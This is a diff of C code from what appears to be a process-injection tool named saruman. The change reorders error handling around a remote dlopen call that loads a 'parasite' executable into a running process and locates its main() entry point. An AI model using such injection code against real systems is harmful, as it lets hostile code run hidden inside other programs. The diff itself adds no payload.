@@ -970,26 +970,8 @@ int main(int argc, char **argv)
 	    dlopen_loader_args, 2);
 	saruman_remote_call(&saruman, &rpc);
 	
-	saruman_debug("Handle: %p\n", (void *)rpc.retval);
-	printf("Successfully injected executable '%s' into memory\n", argv[2]);
+	saruman_debug("dlopen handle: %p\n", (void *)rpc.retval);
 
-	if (saruman_find_injected_base(&saruman) == false) {
-		fprintf(stderr, "Failed to find base address of injected: %s\n", argv[2]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if (elf_symbol_by_name(saruman.elfobj, "main", &symbol) == false) {
-		fprintf(stderr, "elf_symbol_by_name() failed on main\n");
-		exit(EXIT_FAILURE);
-	}
-	saruman_debug("The symbol main: %#lx\n", symbol.value);
-	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value;
-	printf("Entry point of parasite main(): %#lx\n", saruman.parasite.entry_point);
-
-	/*
-	 * If debug is on then call dlerror to see why dlopen is failing
-	 */
-#if DEBUG
 	if ((void *)rpc.retval == NULL) {
 		res = saruman_find_libc_dlerror(&saruman, &dlerror_addr);
 
@@ -1007,8 +989,24 @@ int main(int argc, char **argv)
 		}
 		if (rpc.retval != 0)
 			saruman_debug("dlerror msg: %s\n", tmp);
+		exit(EXIT_FAILURE);
 	}
-#endif
+
+	printf("Successfully injected executable '%s' into memory\n", argv[2]);
+
+
+	if (saruman_find_injected_base(&saruman) == false) {
+		fprintf(stderr, "Failed to find base address of injected: %s\n", argv[2]);
+		exit(EXIT_FAILURE);
+	}
+
+	if (elf_symbol_by_name(saruman.elfobj, "main", &symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name() failed on main\n");
+		exit(EXIT_FAILURE);
+	}
+	saruman_debug("The symbol main: %#lx\n", symbol.value);
+	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value;
+	printf("Entry point of parasite main(): %#lx\n", saruman.parasite.entry_point);
 
 	/*
 	 * A remote call to creat_thread() will begin execution at main() but we need to have
